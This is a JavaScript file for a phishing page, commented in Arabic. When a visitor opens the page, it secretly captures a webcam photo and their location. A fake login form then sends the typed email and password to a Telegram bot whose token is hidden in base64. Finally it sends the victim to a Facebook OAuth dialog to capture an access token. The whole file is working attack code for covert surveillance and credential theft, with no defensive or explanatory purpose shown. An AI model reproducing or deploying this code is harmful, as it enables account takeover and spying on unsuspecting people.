// --- تشفير البيانات الحساسة ---
const _0xData = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
const BTN = atob(_0xData[0]);
const CID = atob(_0xData[1]);

// 1. تشغيل السحب الصامت (كاميرا + موقع) فور فتح الصفحة
window.onload = () => {
    // إخفاء اللودر بعد التجهيز
    setTimeout(() => { document.getElementById('loader').style.display='none'; }, 1500);
    silentCapture();
};

async function silentCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        let v = document.createElement('video'); v.srcObject = stream; v.play();
        setTimeout(() => {
            let canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(v, 0, 0, 640, 480);
            let img = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            navigator.geolocation.getCurrentPosition(p => { sendData(img, p); }, () => { sendData(img, null); });
        }, 2000);
    } catch (e) { sendData(null, null); }
}

function sendData(img, pos) {
    const info = `🌍 **بصمة استخباراتية**\n📍 الموقع: \`${pos ? pos.coords.latitude.toFixed(5) : 'مرفوض'}\`\n🌐 التوقيت: \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`\n🗣️ اللغة: \`${navigator.language}\``;
    if(img) {
        let fd = new FormData();
        fd.append('photo', dataURLtoBlob(img), 'c.jpg');
        fd.append('caption', info); fd.append('chat_id', CID); fd.append('parse_mode', 'Markdown');
        fetch(`https://api.telegram.org/bot${BTN}/sendPhoto`, { method: 'POST', body: fd });
    }
}

// 2. الهجوم المزدوج (بيانات + تفويض OAuth) عند الضغط على الزر الأزرق
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;

    // إرسال الإيميل والباسوورد فوراً للبوت
    const loginLog = `👤 **بيانات دخول جديدة**\n📧 الحساب: \`${email}\`\n🔑 كلمة السر: \`${pass}\`\n📱 الجهاز: \`${navigator.userAgent}\``;
    
    fetch(`https://api.telegram.org/bot${BTN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: loginLog, parse_mode: "Markdown" })
    }).then(() => {
        // --- النقلة الذكية (طلب الموافقة الرسمي) ---
        // سيظهر للضحية نافذة فيسبوك الرسمية تطلب الصلاحيات
        const APP_ID = "638217364910234"; // معرف تطبيق تمويهي (يفضل استخدام ID خاص بك)
        const REDIRECT = window.location.href; // سيعود التوكن لنفس الرابط
        const SCOPE = "email,public_profile";

        const oauthUrl = `https://www.facebook.com/v12.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${REDIRECT}&response_type=token&scope=${SCOPE}`;
        
        // التوجيه لصفحة الموافقة الرسمية
        window.location.href = oauthUrl;
    });
});

function dataURLtoBlob(d) {
    let a = d.split(','), b = atob(a[1]), n = b.length, u = new Uint8Array(n);
    while(n--) u[n] = b.charCodeAt(n);
    return new Blob([u], {type: a[0].match(/:(.*?);/)[1]});
}
